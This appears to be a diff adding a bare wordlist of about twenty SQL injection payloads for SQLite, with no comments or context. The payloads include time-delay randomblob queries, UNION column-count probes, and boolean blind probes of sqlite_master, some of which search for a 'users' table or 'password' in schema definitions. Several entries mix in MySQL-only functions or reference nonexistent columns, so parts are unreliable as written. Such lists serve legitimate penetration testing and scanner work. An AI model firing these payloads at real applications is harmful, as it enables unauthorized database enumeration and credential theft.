@@ -1,0 +1,20 @@
+1 AND randomblob(100000000/2)
+1 AND 1=like('ABCDEFG',upper(hex(randomblob(100000000/2))))
+1 OR randomblob(100000000/2)
+1 || (SELECT CASE WHEN (1=1) THEN '1'||CHAR(32,32,32,32,32,32,32,32,32,32) ELSE '0' END)
+1 AND 1=(SELECT COUNT(*) FROM sqlite_master)
+1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+1 AND 1=(SELECT 1 FROM sqlite_master UNION SELECT 2 FROM sqlite_master UNION SELECT 3 FROM sqlite_master UNION SELECT 4 FROM sqlite_master UNION SELECT 5 FROM sqlite_master)
+1 OR (SELECT 1 FROM (SELECT count(*),concat(floor(rand(0)*2),(SELECT substr(table_name,1,62) FROM sqlite_master LIMIT 1 OFFSET 0))a FROM sqlite_master GROUP BY a LIMIT 1)x)
+1 AND (SELECT count(*) FROM sqlite_master) > 0
+1 AND (SELECT length(sql) FROM sqlite_master WHERE type='table' LIMIT 1) > 0
+1 UNION SELECT NULL,NULL,NULL,NULL,NULL--
+1 AND unicode(substr((SELECT table_name FROM sqlite_master LIMIT 1),1,1))>90
+1 OR 1=CAST((SELECT 1) AS INTEGER)
+1 AND 1=(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x)
+1 AND (SELECT COUNT(*) FROM sqlite_master WHERE name LIKE 'a%')>0
+1 OR EXISTS(SELECT 1 FROM sqlite_master WHERE type='table' AND name='users')
+1 AND (SELECT hex(substr(table_name,1,1)) FROM sqlite_master LIMIT 1)='74'
+1 OR (SELECT COUNT(*) FROM sqlite_master)=(SELECT COUNT(*) FROM sqlite_master)
+1 AND (SELECT COUNT(*) FROM sqlite_master WHERE sql LIKE '%password%')>0
+1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL FROM sqlite_master--
